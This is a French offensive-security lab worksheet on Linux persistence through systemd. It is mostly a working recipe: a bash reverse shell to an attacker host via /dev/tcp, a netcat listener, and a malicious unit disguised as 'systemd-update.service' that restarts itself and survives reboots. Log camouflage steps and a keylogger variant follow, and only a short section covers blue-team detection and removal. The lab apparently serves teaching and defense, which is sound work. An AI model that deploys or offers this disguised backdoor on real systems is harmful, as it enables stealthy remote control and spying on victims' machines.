# **TP Offensif – Persistance via systemd et services Linux**

---

## **Objectif pédagogique**

Comprendre comment un attaquant :

* Crée un service systemd personnalisé pour **persister** après redémarrage
* Masque ses activités via des noms légitimes (`systemd-update.service`)
* Déploie un reverse shell **camouflé comme un service système**
* Peut exécuter un keylogger ou un script espion à chaque démarrage

---

## **Contexte du TP**

Vous êtes dans un lab isolé. Vous avez obtenu un accès `root` sur une machine Linux via une faille. Votre objectif est de **maintenir un accès furtif et persistant** même après un redémarrage.

---

## **Étape 1 – Création d’un faux service `systemd` malveillant**

### 1.1 Créez un reverse shell (bash)

```bash
mkdir -p /opt/.malicious
nano /opt/.malicious/reverse.sh
```

Contenu :

```bash
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

Remplacez `ATTACKER_IP` par l’IP de votre Kali Linux.
Ensuite :

```bash
chmod +x /opt/.malicious/reverse.sh
```

Côté attaquant :

```bash
nc -lvnp 4444
```

---

### 1.2 Création du service déguisé

```bash
nano /etc/systemd/system/systemd-update.service
```

Contenu :

```ini
[Unit]
Description=System Update Daemon
After=network.target

[Service]
Type=simple
ExecStart=/opt/.malicious/reverse.sh
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

---

### 1.3 Activation et camouflage

```bash
systemctl daemon-reload
systemctl enable systemd-update
systemctl start systemd-update
```

Le reverse shell se relancera automatiquement à chaque redémarrage, comme s’il s’agissait d’un vrai service système.

---

## **Étape 2 – Observation de la persistance**

Redémarrez la machine victime :

```bash
reboot
```

Sur la machine de l’attaquant (Kali), le shell revient automatiquement :

```
Connection from 192.168.1.X:xxxx
bash-5.1#
```

---

## **Étape 3 – Déguisement avancé (optionnel)**

Renommer les fichiers de logs :

```bash
touch /var/log/systemd-journal.log
```

Modifier le script pour logger dans un fichier apparemment légitime :

```bash
echo "shell actif : $(date)" >> /var/log/systemd-journal.log
```

---

## **Étape 4 – Nettoyage (à faire dans le TP final)**

Montrez comment un **analyste blue team** détecterait cette attaque :

```bash
systemctl list-units --type=service
systemctl cat systemd-update
```

Puis :

```bash
systemctl disable systemd-update
rm /etc/systemd/system/systemd-update.service
rm -rf /opt/.malicious/
```

---

## **Bonus – Variante avec keylogger ou espion**

Créer un service `usb-watcher.service` qui lit les événements `udev`, ou exécute un script Python qui écoute les touches (`pynput`), ou un enregistrement réseau avec `tcpdump`.

---

## **Évaluation attendue**

L’étudiant doit :

* Créer un service systemd malveillant
* L’activer pour qu’il s’exécute au démarrage
* Camoufler le service (nom, chemin)
* Démontrer que le service redonne un shell après reboot
* Montrer le code source, la configuration systemd et les effets en live
* Fournir un guide de suppression post-analyse

